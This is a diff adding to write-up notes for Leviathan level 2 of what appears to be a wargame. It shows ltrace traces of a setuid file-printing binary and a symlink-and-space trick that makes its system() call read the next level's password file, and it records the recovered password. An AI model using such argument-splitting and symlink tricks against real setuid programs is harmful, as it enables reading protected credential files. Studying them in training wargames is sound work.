@@ -62,7 +62,7 @@ Leviathan 2 {
 		it has to be readable by the user.
 
 	we can see this runing the executable with the ltrace command:
-		$ ltrace /etc/leviathan_pass/leviathan3
+		$ ltrace ./printfile /etc/leviathan_pass/leviathan3
 		__libc_start_main(0x804852b, 2, 0xffffd734, 0x8048610 <unfinished ...>
 		access("/etc/leviathan_pass/leviathan3", 4)                                                                                      = -1
 		puts("You cant have that file..."You cant have that file...
@@ -70,7 +70,55 @@ Leviathan 2 {
 		+++ exited (status 1) +++
 
 	On the second line it uses the acces function with the entered file and 4 (R_OK, read ok) as arguments and returns -1 if its not readable and 0 if it is.
+	So if the file is readable it will continue with the program and print it.
 
-	
+	Lets try with a file we own (prev. created the file and directory):
+		$ ltrace ./printfile /tmp/pleb/test_file
+		__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
+		access("/tmp/pleb/test_file", 4)                                                                                                 = 0
+		snprintf("/bin/cat /tmp/pleb/test_file", 511, "/bin/cat %s", "/tmp/pleb/test_file")                                              = 28
+		geteuid()                                                                                                                        = 12002
+		geteuid()                                                                                                                        = 12002
+		setreuid(12002, 12002)                                                                                                           = 0
+		system("/bin/cat /tmp/pleb/test_file"This is a test
+		 <no return ...>
+		--- SIGCHLD (Child exited) ---
+		<... system resumed> )                                                                                                           = 0
+		+++ exited (status 0) +++
 
+	As we can see there is no problem and prints the file:
+		system("/bin/cat /tmp/pleb/test_file"This is a test
+
+	Now lets try with a file name with some spaces in it and see what happens:
+		$ ltrace ./printfile /tmp/pleb/file1\ file2
+		__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
+		access("/tmp/pleb/file1 file2", 4)                                                                                               = 0
+		snprintf("/bin/cat /tmp/pleb/file1 file2", 511, "/bin/cat %s", "/tmp/pleb/file1 file2")                                          = 30
+		geteuid()                                                                                                                        = 12002
+		geteuid()                                                                                                                        = 12002
+		setreuid(12002, 12002)                                                                                                           = 0
+		system("/bin/cat /tmp/pleb/file1 file2"/bin/cat: /tmp/pleb/file1: No such file or directory
+		/bin/cat: file2: No such file or directory
+		 <no return ...>
+		--- SIGCHLD (Child exited) ---
+		<... system resumed> )                                                                                                           = 256
+		+++ exited (status 0) +++
+
+	This is more interesting, as we can see in the 7th line first tries to print this file /tmp/pleb/file1 and then the file /file2.
+	We can use this as an exploit to print the password for the next level, how?¿ with a symbolic link.
+	First we create a symlink to the password:
+		$ ln -s /etc/leviathan_pass/leviathan3 file1
+
+	We name the link as file1 because like this it will print it whe we use this command: ./printfile /tmp/pleb/file1\ file2
+
+	And we finally try to print the password:
+		$ ./printfile /tmp/pleb/file1\ file2
+		Ahdiemoo1j
+		/bin/cat: file2: No such file or directory
+
+	Finally we have the password!
+}
+
+Leviathan3 {
+	leviathan3:Ahdiemoo1j
 }
